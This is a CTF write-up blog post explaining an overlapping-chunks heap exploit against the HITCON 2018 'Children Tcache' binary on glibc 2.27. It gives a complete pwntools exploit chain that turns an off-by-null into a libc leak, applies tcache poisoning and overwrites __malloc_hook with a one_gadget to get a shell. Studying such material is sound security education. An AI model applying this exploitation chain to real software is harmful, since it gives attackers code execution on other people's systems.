---
layout:     post
title:      "Overlapping Chunks: GLIBC 2.27 Heap Exploitation"
date:       2021-01-21
author:    "D4mianWayne"
tag:      libc-2.27, heap, pwn, ctf, hitcon, tcache, roppy
category:  Pwning
---

This is going to be an in-depth explaination of the overlapping chunks techniques on GLIBC 2.27, this technique can also be produced on the GLIBC 2.23 but for this blog, I did two challengs from HITCON CTF 2018 which seemed very interesting in themselves. I appreciated this challenges as I learned a lot about heap internals and how the heap really recycles the chunk and how `prev_size` plays a big role here.

# Foreword

This technique of overlapping refers to the scenario when a `free`'d chunk actually overlaps into an already allocated chunk resulting in overwriting the heap pointer of the other chunks. This is usally chained with the Off By Null overflow resulting in the `PREV_INUSE` bit of the next chunk being overwritten.

The best way to understand this technique is to make use of the challenge(s) since that way we will analyse the heap as we step in. Now, to start off, there are two binaries taken from the HITCON 2018 CTF, following are the link to the binary, Libc, exploits and IDA database for the corresponding binary.

***
##### Attachment

* **Children Tcache** : 
* **Baby Tcache** : 

***

Now, let's continue on the challenges.

# Children Tcache

This challenge was remarkably easier than the Baby Tcache from the same CTF, that being said, let's start with checking the binary's security:-

```r
agrant@ubuntu-bionic:~/sharedFolder/training/hitcon$ checksec baby_tcache
[*] '/home/vagrant/sharedFolder/training/hitcon/baby_tcache'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
```

As expected from the good CTF, all the security mechanisms are enabled but little do we know, it doesn't even matter, let's work on. Now, for this part, explaining the whole binary functionalities would be tiresome and won't be needed at all, all we need to is to find the overall workflow of the binary and where exactly the vulnerability reside. The vulnerabilty as mentioned before the technique we are going to discuss here usually chained with the Off by Null vulnerability.

```C
unsigned __int64 add()
{
  int i; // [rsp+Ch] [rbp-2034h]
  char *dest; // [rsp+10h] [rbp-2030h]
  unsigned __int64 size; // [rsp+18h] [rbp-2028h]
  char s; // [rsp+20h] [rbp-2020h]
  unsigned __int64 v5; // [rsp+2038h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  memset(&s, 0, 0x2010uLL);
  for ( i = 0; ; ++i )
  {
    if ( i > 9 )
    {
      puts(":(");
      return __readfsqword(0x28u) ^ v5;
    }
    if ( !heap_list[i] )
      break;
  }
  printf("Size:");
  size = read_int();
  if ( size > 0x2000 )
    exit(-2);
  dest = (char *)malloc(size);
  if ( !dest )
    exit(-1);
  printf("Data:");
  read_string((__int64)&s, size);
  strcpy(dest, &s);
  heap_list[i] = dest;
  size_list[i] = size;
  return __readfsqword(0x28u) ^ v5;
}
```
The `read_string` is not vulnerable here, actually the issue here is the `strcpy(dest, &s)`, since `strcpy` copies the data from the `&s` to the `dest` including the terminator `\0` null byte, this leads to Off by Null overflow, as the technqiue implies, the `man strcpy` says:-

> The `strcpy()` function copies the string pointed to by `src`, including the terminating null byte (`'\0`'), to the buffer pointed to by `dest`. The strings may not overlap, and the destination string dest
>      must be large enough to receive the copy.

 Now, since we know that there is a vulnerability, we need to know the overall workflow of this binary, the workflow is as following:-

 * It implements 3 basic functions, `add`, `delete` and `view`.
 * It used a global pointer to store information about chunks and the size allocated.
 * The `add` function is vulnerable to the Off by Null vulnerability.
 * It allows the allocation size upto `0x2000`.
 * There's no Use After Free vulnerability.
 * It allows the active number of allocations upto 10(inclusice) times.

 ### Exploitation 

 First and foremost, I created the wrapper functions such that we interact with binary more freely:-

 ```py
from pwn import *

def new_heap(size, data, attack=False):
    p.sendlineafter('Your choice: ', '1')
    p.sendlineafter('Size:', str(size))
    if attack:
        return
    p.sendafter('Data:', data)
    if len(data) < size:
        p.sendline()

def show_heap(index):
    p.sendlineafter('Your choice: ', '2')
    p.sendlineafter('Index:', str(index))

def delete_heap(index):
    p.sendlineafter('Your choice: ', '3')
    p.sendlineafter('Index:', str(index))

```

This being aide, now let's jump into the heap exploitation part, to start off, we will create following number of chunks:-

* `0x500` size chunk.
* `0x68` size chunk.
* `0x5f0` size chunk.
* `0x18` size chunk.

This is because, we will need the 2 chunk of siz such taht when `tcache` bins would be full they'll land into the `unsorted` bin. Moving on, we will fill the `tcache` bins for the `size` of the chunks we allocated:-

```py

# heap_list[0] => chunk_0 (0x511)
new_heap(0x500, 'a' * 0x4ff)

# heap_list[1] => chunk_1 (0x71)
new_heap(0x68, 'b' * 0x67)

# heap_list[2] => chunk_2 (0x601)

new_heap(0x5f0, 'c' * 0x5ef)

# heap_list[3] => chunk_3 (0x31)
# This chunk is for preventing consolidation of previous chunk with the top chunk

new_heap(0x20, 'd' * 0x20)
```
Now, this will do the allocation, as nothing important to see as much, to explain the size allocation here, we will be `unsorted` bin size for doing the overlapping chunk here, to move on, we will delete the `chunk_1` and `chunk_0`, the `chunk_1` belongs to the `unsorted` bin since it's size is morte than the `tcache` can hold and the `chunk_0` will go in the `tcache`.
```py
# we need to delete chunk_1, this is because we will be using this chunk to
#  to trigger the off-by-null (poison-null-byte) attack

delete_heap(1)

# chunk_0 should be freed so it can be consolidated with chunk_2 later
delete_heap(0)
```

Running the exploit:-

```r
ef➤  heap bins
──────────────────────────────────────────────────── Tcachebins for arena 0x7ffff7dcdc40 ────────────────────────────────────────────────────
Tcachebins[idx=5, size=0x70] count=1  ←  Chunk(addr=0x555555757770, size=0x70, flags=) 
───────────────────────────────────────────────────── Fastbins for arena 0x7ffff7dcdc40 ─────────────────────────────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
──────────────────────────────────────────────────── Unsorted Bin for arena 'main_arena' ────────────────────────────────────────────────────
[+] unsorted_bins[0]: fw=0x555555757250, bk=0x555555757250
 →   Chunk(addr=0x555555757260, size=0x510, flags=PREV_INUSE)
[+] Found 1 chunks in unsorted bin.
───────────────────────────────────────────────────── Small Bins for arena 'main_arena' ─────────────────────────────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
───────────────────────────────────────────────────── Large Bins for arena 'main_arena' ─────────────────────────────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
gef➤  
```

Now, as you can see the chunk `0x555555757260` belongs to the `unsorted` bin and the chunk `0x555555757770` belongs to the `tcache`'s `bin[5]` being the size `0x70`. Now, the tricky part is that, whenever the chunk is `free`'d, the program `memsets` the `free`'d chunk with the `0xda` byte by byte, overwriting whatever was written in the chunk so far.

```py
# when we free a chunk, programs writes 0xDA to the whole chunk
# so, we need to zero out some parts of the chunk_1. Therefore,
# we are allocating/freeing the chunk_1 multiple times with different sizes
# interestingly, it always have chunk size of 0x71, but the program only cares
# about the input size
for i in range(9):
    # table[0] => chunk_1 (0x71)
    # this causes strcpy writes null byte at the end of buffer.
    # when i == 0, off-by-one happens and turn size of chunk_2 from
    # 0x601 t0 0x600. Therefore, we clear PREV_IN_USE bit.
    new_heap(0x68 - i, 'b' * (0x68 - i))
    # we need to free the chunk, so malloc returns it on the next new_heap call
    delete_heap(0)
```
So, what we do here is, since the `free`'d chunk's contents is being overwritten by the `0xda` byte by byte, to mitigate this in such a way that the `chunk_1`, the chunk which went into the `tcache`, so here doing constant allocation of the size ranging from the `0x5f` to `0x68`, all of them will land into the `tcache` bin[5] since the rounding size for the chunks allocated in that range will have the `0x70` size and will be in the `bin[5]`.

Now, doing allocation and the deletion of the chunks accordingly, since the `strcpy` will append the `\0` to the adjancent chunk and the continual deletion and the allocation of the chunks as the size is same as of `0x70`, for every allocation it'll just return the chunk from the `bin[5]`, this will result in the `PREV_INUSE` flag of the adjacent chunk being overwritten.

```r
gef➤  heap bins
──────────────────────────────────────────────────── Tcachebins for arena 0x7ffff7dcdc40 ────────────────────────────────────────────────────
Tcachebins[idx=5, size=0x70] count=1  ←  Chunk(addr=0x555555757770, size=0x70, flags=) 
───────────────────────────────────────────────────── Fastbins for arena 0x7ffff7dcdc40 ─────────────────────────────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
──────────────────────────────────────────────────── Unsorted Bin for arena 'main_arena' ────────────────────────────────────────────────────
[+] unsorted_bins[0]: fw=0x555555757250, bk=0x555555757250
 →   Chunk(addr=0x555555757260, size=0x510, flags=PREV_INUSE)
[+] Found 1 chunks in unsorted bin.
───────────────────────────────────────────────────── Small Bins for arena 'main_arena' ─────────────────────────────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
───────────────────────────────────────────────────── Large Bins for arena 'main_arena' ─────────────────────────────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
gef➤  x/10xg  0x0000555555554000 + 0x202060
0x555555756060:	0x0000000000000000	0x0000000000000000
0x555555756070:	0x00005555557577e0	0x0000555555757de0
gef➤  x/2xg 0x00005555557577e0 - 0x10
0x5555557577d0:	0x0000000000000000	0x0000000000000600
gef➤  heap chunk 0x00005555557577e0
Chunk(addr=0x5555557577e0, size=0x600, flags=)
Chunk size: 1536 (0x600)
Usable size: 1528 (0x5f8)
Previous chunk size: 0 (0x0)
PREV_INUSE flag: Off
IS_MMAPPED flag: Off
NON_MAIN_ARENA flag: Off

gef➤  
```

Now, as you can see the `heap_list` is at the address `0x555555756060` which have the chunk `0x00005555557577e0` at the index 2, seeing the `PREV_INUSE` flag for that chunk we see that it is cleared. Now, to work on with this, we will overwrite the `prev_size` for the `chunk_2`, what we will do is allocate a chunk of size `0x68` such that it'll be returned by the `tcache` and we will overwrite the adjacent chunk's i.e. `chunk_2`'s `prev_size`.

```py
# table[0] => chunk_1 (0x71)
# this set the prev_size field of chunk_2
new_heap(0x68, 'b' * 0x60 + p64(0x580))

# when we free chunk_2, it consolidates with chunk_0
# therefore, we have a overlapping free chunk with chunk_1
# the resulting big chunk will be put in the unsorted bin
delete_heap(2)
```

Doing so,

```r
gef➤  heap bins
──────────────────────────────────────────────────── Tcachebins for arena 0x7ffff7dcdc40 ────────────────────────────────────────────────────
───────────────────────────────────────────────────── Fastbins for arena 0x7ffff7dcdc40 ─────────────────────────────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
──────────────────────────────────────────────────── Unsorted Bin for arena 'main_arena' ────────────────────────────────────────────────────
[+] unsorted_bins[0]: fw=0x555555757250, bk=0x555555757250
 →   Chunk(addr=0x555555757260, size=0xb80, flags=PREV_INUSE)
[+] Found 1 chunks in unsorted bin.
───────────────────────────────────────────────────── Small Bins for arena 'main_arena' ─────────────────────────────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
───────────────────────────────────────────────────── Large Bins for arena 'main_arena' ─────────────────────────────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
gef➤  x/10xg  0x0000555555554000 + 0x202060
0x555555756060:	0x0000555555757770	0x0000000000000000
0x555555756070:	0x0000000000000000	0x0000555555757de0
0x555555756080:	0x0000000000000000	0x0000000000000000
0x555555756090:	0x0000000000000000	0x0000000000000000
0x5555557560a0:	0x0000000000000000	0x0000000000000000
gef➤  x/30xg 0x0000555555757770
0x555555757770:	0x6262626262626262	0x6262626262626262
0x555555757780:	0x6262626262626262	0x6262626262626262
0x555555757790:	0x6262626262626262	0x6262626262626262
0x5555557577a0:	0x6262626262626262	0x6262626262626262
0x5555557577b0:	0x6262626262626262	0x6262626262626262
0x5555557577c0:	0x6262626262626262	0x6262626262626262
0x5555557577d0:	0x0000000000000580	0x0000000000000600 <-------------- The prev_size has been overwritten
```

Now, we will have to `free(2)` such that the `chunk_3` the target chunk having the `prev_size` value `0x580` will consolidate with the chunk `0x0000555555757770`, so when we allocate a chunk of the size being the `0x508` this will result in the `fd` and the `bk` being populated with the `main_arena`'s address for the chunk `0x0000555555757770`, so initially the `chunk_0` i.e. `0x0000555555757770`  was not cleared but consolidated but since the global pointer contains this chunk's pointer on the index `0`, doing `show(0)`, we will have the LIBC leak, with the help of it we can defeat the ASLR.

```
# table[1] => chunk_4 (0x511)
# this will use the unsorted bin for allocation, and writes
# a libc address into chunk_1 fd/bk fi
new_heap(0x508, 'e' * 0x507)

# viwing chunk_1 will leak libc address
show_heap(0)
```

Now, doing so:-

```r
gef➤  x/10xg  0x0000555555554000 + 0x202060
0x555555756060:	0x0000555555757770	0x0000555555757260
0x555555756070:	0x0000000000000000	0x0000555555757de0
0x555555756080:	0x0000000000000000	0x0000000000000000
0x555555756090:	0x0000000000000000	0x0000000000000000
0x5555557560a0:	0x0000000000000000	0x0000000000000000
gef➤  x/8xg 0x0000555555757770 - 0x10
0x555555757760:	0x0065656565656565	0x0000000000000671  <--- the 0x671 = (0x600 + 0x71) is consolidated and for which after the allocation the fd & bk is populated
0x555555757770:	0x00007ffff7dcdca0	0x00007ffff7dcdca0
```

The roppy's output:-

```r
vagrant@ubuntu-bionic:~/sharedFolder/training/hitcon$ python3 children_tcache.py
[+] Starting local process './children_tcache': pid 2842
[*] LIBC Base: 0x7ffff79e2000
[*] Switching to interactive mode
$$$$$$$$$$$$$$$$$$$$$$$$$
🍊    Children Tcache    🍊
$$$$$$$$$$$$$$$$$$$$$$$$$$$
$   1. New heap           $
$   2. Show heap          $
$   3. Delete heap        $ 
$   4. Exit               $ 
$$$$$$$$$$$$$$$$$$$$$$$$$$$
Your choice: $ 
```

Now, we have the LIBC leak, defeating the ASLR, we have to now force the `malloc` to return a pointer which we can overwrite like `__malloc_hook` or `__free_hook` by taking advantage of the heap layout. To do so, initally we will take the overlapping of these chunks to get the duplicate entry, to replicate it, we will allocate a chunk of size `0x68` this will return the chunk as same as of the `chunk_1`. So, when we do the `free(1)` and `free(5)`, it'll result in the same chunk being deleted, since two chunks are `free`'d the `tcache` will have the duplicate entry for the chunks, making a loop, due to which we will be able to overwrite the `fd` & `bk` of the `free`'d chunk and let it return the chunk.

```py
# table[2] => chunk_5 (0x71)
# this will allocate chunk_5 exactly in the same place as chunk_1
new_heap(0x68, 'f' * 0x67)

# we used tcache_dup attack here which is due to double free
# freeing chunk_1 and chunk_5 put them in the same bin in tcache
# even though they are pointing to the same address
delete_heap(0)
delete_heap(2)
```

Now, doing so, when we see the heap layout:-

```r
gef➤  heap bins
──────────────────────────────────────────────────── Tcachebins for arena 0x7ffff7dcdc40 ────────────────────────────────────────────────────
Tcachebins[idx=5, size=0x70] count=2  ←  Chunk(addr=0x555555757770, size=0x70, flags=PREV_INUSE)  ←  Chunk(addr=0x555555757770, size=0x70, flags=PREV_INUSE)  →  [loop detected]
───────────────────────────────────────────────────── Fastbins for arena 0x7ffff7dcdc40 ─────────────────────────────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
──────────────────────────────────────────────────── Unsorted Bin for arena 'main_arena' ────────────────────────────────────────────────────
[+] unsorted_bins[0]: fw=0x5555557577d0, bk=0x5555557577d0
 →   Chunk(addr=0x5555557577e0, size=0x600, flags=PREV_INUSE)
[+] Found 1 chunks in unsorted bin.
───────────────────────────────────────────────────── Small Bins for arena 'main_arena' ─────────────────────────────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
───────────────────────────────────────────────────── Large Bins for arena 'main_arena' ─────────────────────────────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
gef➤  x/10xg 0x555555757770
0x555555757770:	0x0000555555757770	0x0000555555757010  The fd of this chunk is overwritten with its own address
0x555555757780:	0xdadadadadadadada	0xdadadadadadadada
0x555555757790:	0xdadadadadadadada	0xdadadadadadadada
0x5555557577a0:	0xdadadadadadadada	0xdadadadadadadada
```

As shown from the `tcache` bins, we have a `free`'d chunk's `fd` is pointing to it's own address, which commonly refer as `tcache` dup entry. Now, we will overwrite the `fd` of the same chunk with the target chunk, for the target chunk I used the `__malloc_hook` but you can also go with the `__free_hook` way:-


Now, to do so, we will allocate a chunk, which will return the chunk `0x0000555555757770`, then we will overwrite the `fd` pointer with the target chunk `__malloc_hook`, then we will do one more allocation such that it'll have the `tcache` head pointing to the target chunk adress:-

```py
# we can create a fake chunk before __malloc_hook with size of 0x7f
malloc_hook = libc_base + 0x3ebc30
fake_chunk = malloc_hook - 0x23
log.info('fake chunk: {}'.format(hex(fake_chunk)))

# table[4] => chunk_5 (0x71)
# we used tcache_poisoning here
# chunk_5 will be served from tcache and we will put the address of
# our fake chunk in the chunk_1's fd.
new_heap(0x68, p64(fake_chunk))

# table[5] => chunk_1 (0x71)
# this allocation serves chunk_1 and put fake chunk address in the tcache
new_heap(0x68, 'h' * 0x67)
```

Doing so:-

```r
gef➤  heap bins tcache
──────────────────────────────────────────────────── Tcachebins for arena 0x7ffff7dcdc40 ────────────────────────────────────────────────────
Tcachebins[idx=5, size=0x70] count=0  ←  Chunk(addr=0x7ffff7dcdc0d, size=0x0, flags=)  ←  [Corrupted chunk at 0xfff7dc9d60000000]
```

Now, the next allocation will return the address `0x7ffff7dcdc0d`, which we can overwrite with the `one_gadget`, resulting in the `__malloc_hook` being overwritten with the `one_gadget`'s address and trigger the `__malloc_hook` by allocating a chunk, hence getting a shell:-

```py
# table[6] => fake_chunk (0x7f)
# since fake_chunk is at the head of the list, this allocation returns it
# then, we overwrite __malloc_hook with one gadget
new_heap(0x68, p64(libc_base + 0x4f322))

# this allocation triggers __malloc_hook and we have shell
new_heap(1, '', True)
```

Doing so:-

```r
vagrant@ubuntu-bionic:~/sharedFolder/training/hitcon$ python3 children_tcache.py
[+] Starting local process './children_tcache': pid 3225
[*] LIBC Base: 0x7ffff79e2000
[*] fake chunk: 0x7ffff7dcdc30
[*] Switching to interactive mode
$ whoami
vagrant
$ echo "Pwned"
Pwned
$ 
[*] Interrupted
```

This was an interesting challenge.